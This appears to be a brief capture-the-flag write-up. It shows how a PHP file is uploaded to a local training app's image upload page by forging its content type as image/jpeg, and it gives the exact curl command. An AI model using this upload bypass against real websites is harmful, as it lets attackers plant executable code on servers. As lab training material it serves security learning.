When we click on `ADD_IMAGE` on the main page, we reach the upload page http://localhost:8080/?page=upload and we're going to try and breach it.

Looking through the page's code we see that the form type is `multipart`. We're going to try and upload a .php file, but we need to pass it as a .jpg.

Using curl:

`curl -X POST -F "uploaded=@test.php;type=image/jpeg" -F "Upload=Upload" "http://localhost:8080/index.php?page=upload" > page`

We get our next flag !